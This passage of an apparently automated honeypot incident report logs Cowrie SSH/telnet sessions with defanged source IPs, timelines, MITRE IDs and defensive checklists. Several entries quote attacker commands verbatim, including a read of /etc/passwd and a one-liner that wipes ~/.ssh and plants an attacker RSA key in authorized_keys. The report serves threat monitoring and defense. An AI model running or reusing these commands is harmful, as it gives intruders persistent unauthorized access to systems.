| **First Seen** | 2026-08-29 15:50 |
| **Last Seen** | 2026-08-29 15:51 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:50:41` | `cowrie.session.connect` |
| `2026-08-29 15:50:42` | `cowrie.telnet.option` |
| `2026-08-29 15:50:42` | `cowrie.telnet.option` |
| `2026-08-29 15:50:42` | `cowrie.login.success` |
| `2026-08-29 15:50:43` | `cowrie.session.params` |
| `2026-08-29 15:50:43` | `cowrie.telnet.option` |
| `2026-08-29 15:50:43` | `cowrie.telnet.option` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.failed` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:50:43` | `cowrie.command.input` |
| `2026-08-29 15:51:43` | `cowrie.log.closed` |
| `2026-08-29 15:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.111.146[.]165` to AbuseIPDB if not already reported
- [ ] Block `36.111.146[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-905696f5c2d6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:54 |
| **Last Seen** | 2026-08-29 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:54:51` | `cowrie.session.connect` |
| `2026-08-29 15:54:51` | `cowrie.client.version` |
| `2026-08-29 15:54:51` | `cowrie.client.kex` |
| `2026-08-29 15:54:52` | `cowrie.login.success` |
| `2026-08-29 15:54:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:54:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:54:53` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74238e81ae7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:00 |
| **Last Seen** | 2026-08-29 16:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:00:33` | `cowrie.session.connect` |
| `2026-08-29 16:00:33` | `cowrie.client.version` |
| `2026-08-29 16:00:33` | `cowrie.client.kex` |
| `2026-08-29 16:00:35` | `cowrie.login.success` |
| `2026-08-29 16:00:35` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:00:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:00:36` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1321813f0bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:04 |
| **Last Seen** | 2026-08-29 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:04:42` | `cowrie.session.connect` |
| `2026-08-29 16:04:42` | `cowrie.client.version` |
| `2026-08-29 16:04:42` | `cowrie.client.kex` |
| `2026-08-29 16:04:43` | `cowrie.login.success` |
| `2026-08-29 16:04:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:04:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:04:43` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc61a36215f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-29 16:08 |
| **Last Seen** | 2026-08-29 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:08:20` | `cowrie.session.connect` |
| `2026-08-29 16:08:20` | `cowrie.client.version` |
| `2026-08-29 16:08:20` | `cowrie.client.kex` |
| `2026-08-29 16:08:20` | `cowrie.login.success` |
| `2026-08-29 16:08:21` | `cowrie.session.params` |
| `2026-08-29 16:08:21` | `cowrie.command.input` |
| `2026-08-29 16:08:21` | `cowrie.command.failed` |
| `2026-08-29 16:08:21` | `cowrie.log.closed` |
| `2026-08-29 16:08:21` | `cowrie.session.params` |
| `2026-08-29 16:08:21` | `cowrie.command.input` |
| `2026-08-29 16:08:21` | `cowrie.session.file_download` |
| `2026-08-29 16:08:21` | `cowrie.log.closed` |
| `2026-08-29 16:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2559d58caa88

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-29 16:08 |
| **Last Seen** | 2026-08-29 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:08:21` | `cowrie.session.connect` |
| `2026-08-29 16:08:21` | `cowrie.client.version` |
| `2026-08-29 16:08:21` | `cowrie.client.kex` |
| `2026-08-29 16:08:21` | `cowrie.login.success` |
| `2026-08-29 16:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855c686508be

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-29 16:08 |
| **Last Seen** | 2026-08-29 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:08:21` | `cowrie.session.connect` |
| `2026-08-29 16:08:21` | `cowrie.client.version` |
| `2026-08-29 16:08:21` | `cowrie.client.kex` |
| `2026-08-29 16:08:21` | `cowrie.login.success` |
| `2026-08-29 16:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1cfc8b8a1d

| Field | Detail |
|---|---|
| **Source IP** | `37.255.251[.]226` |
| **First Seen** | 2026-08-29 16:08 |
| **Last Seen** | 2026-08-29 16:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:08:57` | `cowrie.session.connect` |
| `2026-08-29 16:08:57` | `cowrie.client.version` |
| `2026-08-29 16:08:57` | `cowrie.client.kex` |
| `2026-08-29 16:08:58` | `cowrie.login.success` |
| `2026-08-29 16:08:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.255.251[.]226` to AbuseIPDB if not already reported
- [ ] Block `37.255.251[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ce55a7b6e6

| Field | Detail |
|---|---|
| **Source IP** | `20.91.137[.]76` |
| **First Seen** | 2026-08-29 16:09 |
| **Last Seen** | 2026-08-29 16:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:09:25` | `cowrie.session.connect` |
| `2026-08-29 16:09:25` | `cowrie.client.version` |
| `2026-08-29 16:09:26` | `cowrie.client.kex` |
| `2026-08-29 16:09:26` | `cowrie.login.success` |
| `2026-08-29 16:09:27` | `cowrie.session.params` |
| `2026-08-29 16:09:27` | `cowrie.command.input` |
| `2026-08-29 16:09:27` | `cowrie.command.failed` |
| `2026-08-29 16:09:27` | `cowrie.log.closed` |
| `2026-08-29 16:09:28` | `cowrie.session.params` |
| `2026-08-29 16:09:28` | `cowrie.command.input` |
| `2026-08-29 16:09:28` | `cowrie.session.file_download` |
| `2026-08-29 16:09:28` | `cowrie.log.closed` |
| `2026-08-29 16:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.91.137[.]76` to AbuseIPDB if not already reported
- [ ] Block `20.91.137[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3c4e7e353f

| Field | Detail |
|---|---|
| **Source IP** | `20.91.137[.]76` |
| **First Seen** | 2026-08-29 16:09 |
| **Last Seen** | 2026-08-29 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:09:28` | `cowrie.session.connect` |
| `2026-08-29 16:09:28` | `cowrie.client.version` |
| `2026-08-29 16:09:28` | `cowrie.client.kex` |
| `2026-08-29 16:09:29` | `cowrie.login.success` |
| `2026-08-29 16:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.91.137[.]76` to AbuseIPDB if not already reported
- [ ] Block `20.91.137[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-219e7eef0216

| Field | Detail |
|---|---|
| **Source IP** | `20.91.137[.]76` |
| **First Seen** | 2026-08-29 16:09 |
| **Last Seen** | 2026-08-29 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:09:29` | `cowrie.session.connect` |
| `2026-08-29 16:09:29` | `cowrie.client.version` |
| `2026-08-29 16:09:29` | `cowrie.client.kex` |
| `2026-08-29 16:09:29` | `cowrie.login.success` |
| `2026-08-29 16:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.91.137[.]76` to AbuseIPDB if not already reported
- [ ] Block `20.91.137[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c666351df21b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:11 |
| **Last Seen** | 2026-08-29 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:11:06` | `cowrie.session.connect` |
| `2026-08-29 16:11:06` | `cowrie.client.version` |
| `2026-08-29 16:11:06` | `cowrie.client.kex` |
| `2026-08-29 16:11:07` | `cowrie.login.success` |
| `2026-08-29 16:11:07` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:11:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:11:07` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-536aa783ea76

| Field | Detail |
|---|---|
| **Source IP** | `209.14.89[.]110` |
| **First Seen** | 2026-08-29 16:12 |
| **Last Seen** | 2026-08-29 16:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:12:24` | `cowrie.session.connect` |
| `2026-08-29 16:12:25` | `cowrie.client.version` |
| `2026-08-29 16:12:25` | `cowrie.client.kex` |
| `2026-08-29 16:12:27` | `cowrie.login.success` |
| `2026-08-29 16:12:28` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.14.89[.]110` to AbuseIPDB if not already reported
- [ ] Block `209.14.89[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b2fe486188

| Field | Detail |
|---|---|
| **Source IP** | `163.47.134[.]124` |
| **First Seen** | 2026-08-29 16:13 |
| **Last Seen** | 2026-08-29 16:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:13:12` | `cowrie.session.connect` |
| `2026-08-29 16:13:12` | `cowrie.client.version` |
| `2026-08-29 16:13:13` | `cowrie.client.kex` |
| `2026-08-29 16:13:13` | `cowrie.login.success` |
| `2026-08-29 16:13:13` | `cowrie.session.params` |
| `2026-08-29 16:13:13` | `cowrie.command.input` |
| `2026-08-29 16:13:13` | `cowrie.command.failed` |
| `2026-08-29 16:13:13` | `cowrie.log.closed` |
| `2026-08-29 16:13:14` | `cowrie.session.params` |
| `2026-08-29 16:13:14` | `cowrie.command.input` |
| `2026-08-29 16:13:14` | `cowrie.session.file_download` |
| `2026-08-29 16:13:14` | `cowrie.log.closed` |
| `2026-08-29 16:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.47.134[.]124` to AbuseIPDB if not already reported
- [ ] Block `163.47.134[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2755cec50d5

| Field | Detail |
|---|---|
| **Source IP** | `163.47.134[.]124` |
| **First Seen** | 2026-08-29 16:13 |
| **Last Seen** | 2026-08-29 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:13:14` | `cowrie.session.connect` |
| `2026-08-29 16:13:14` | `cowrie.client.version` |
| `2026-08-29 16:13:14` | `cowrie.client.kex` |
| `2026-08-29 16:13:15` | `cowrie.login.success` |
| `2026-08-29 16:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.47.134[.]124` to AbuseIPDB if not already reported
- [ ] Block `163.47.134[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b64906b18a9

| Field | Detail |
|---|---|
| **Source IP** | `163.47.134[.]124` |
| **First Seen** | 2026-08-29 16:13 |
| **Last Seen** | 2026-08-29 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:13:15` | `cowrie.session.connect` |
| `2026-08-29 16:13:15` | `cowrie.client.version` |
| `2026-08-29 16:13:15` | `cowrie.client.kex` |
| `2026-08-29 16:13:16` | `cowrie.login.success` |
| `2026-08-29 16:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.47.134[.]124` to AbuseIPDB if not already reported
- [ ] Block `163.47.134[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e7fe151d27

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:14 |
| **Last Seen** | 2026-08-29 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:14:03` | `cowrie.session.connect` |
| `2026-08-29 16:14:03` | `cowrie.client.version` |
| `2026-08-29 16:14:03` | `cowrie.client.kex` |
| `2026-08-29 16:14:04` | `cowrie.login.success` |
| `2026-08-29 16:14:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:14:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:14:05` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49b384e6372e

| Field | Detail |
|---|---|
| **Source IP** | `183.96.163[.]213` |
| **First Seen** | 2026-08-29 16:14 |
| **Last Seen** | 2026-08-29 16:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:14:59` | `cowrie.session.connect` |
| `2026-08-29 16:15:00` | `cowrie.client.version` |
| `2026-08-29 16:15:00` | `cowrie.client.kex` |
| `2026-08-29 16:15:02` | `cowrie.login.success` |
| `2026-08-29 16:15:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.96.163[.]213` to AbuseIPDB if not already reported
- [ ] Block `183.96.163[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d2223de935

| Field | Detail |
|---|---|
| **Source IP** | `81.215.2[.]43` |
| **First Seen** | 2026-08-29 16:15 |
| **Last Seen** | 2026-08-29 16:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:15:08` | `cowrie.session.connect` |
| `2026-08-29 16:15:09` | `cowrie.client.version` |
| `2026-08-29 16:15:09` | `cowrie.client.kex` |
| `2026-08-29 16:15:10` | `cowrie.login.success` |
| `2026-08-29 16:15:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd724bca109e

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-08-29 16:15 |
| **Last Seen** | 2026-08-29 16:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:15:16` | `cowrie.session.connect` |
| `2026-08-29 16:15:17` | `cowrie.client.version` |
| `2026-08-29 16:15:17` | `cowrie.client.kex` |
| `2026-08-29 16:15:19` | `cowrie.login.success` |
| `2026-08-29 16:15:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22565a0fc9d0

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-29 16:17 |
| **Last Seen** | 2026-08-29 16:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:17:16` | `cowrie.session.connect` |
| `2026-08-29 16:17:17` | `cowrie.client.version` |
| `2026-08-29 16:17:17` | `cowrie.client.kex` |
| `2026-08-29 16:17:20` | `cowrie.login.success` |
| `2026-08-29 16:17:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7022de000bba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:22 |
| **Last Seen** | 2026-08-29 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
